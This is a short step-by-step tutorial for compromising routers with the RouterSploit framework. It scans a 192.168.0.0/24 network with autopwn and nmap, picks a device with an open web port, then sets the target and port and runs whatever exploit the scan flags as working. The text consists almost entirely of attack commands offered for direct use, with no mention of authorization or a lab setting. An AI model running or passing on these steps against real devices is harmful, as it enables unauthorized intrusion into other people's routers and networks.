## IN THIS TOTURIAL YOU WILL LEARN HOW TO EXPLOIT A ROUTER USING ROUTERSPLOIT.



STEP 1:  sudo routersploit 

STEP 2:  sudo python ./rsf.py (if you are git cloning router repo then you will use this command in the routersploit directory to run it (https://github.com/threat9/routersploit))

STEP 3:  use scanners/autopwn

STEP 4:  show options

STEP 5:  set target 192.168.0.1

STEP 6:  run

STEP 7:  now open second terminal and run nmap command to check whether there are any open ports on the network or not 

STEP 8:  nmap -p 80,8080,8081,81 192.168.0.0/24

STEP 9:  now copy the ip address and paste in the browser with :port number (192.168.0.9:81)

STEP 10:  now we will exploit this using the routersploit 

STEP 11:  set target 192.168.0.? (enter the ip which you coppied from nmap)

STEP 12:  set port to 81 (type the port which you selected in nmap )

STEP 13:  run

STEP 14:  now if the device is vulnerable then it will show in results then just copy the exploit 

STEP 15:  use (paste the exploit which was shown above in device is vulnerable)

STEP 16:  set target 192.168.0.? (enter the target ip which is vulnerable and we used earlier)

STEP 17:  set port 81 (use the port which was used earlier and was vulnerable )

STEP 18:  check

STEP 19:  run
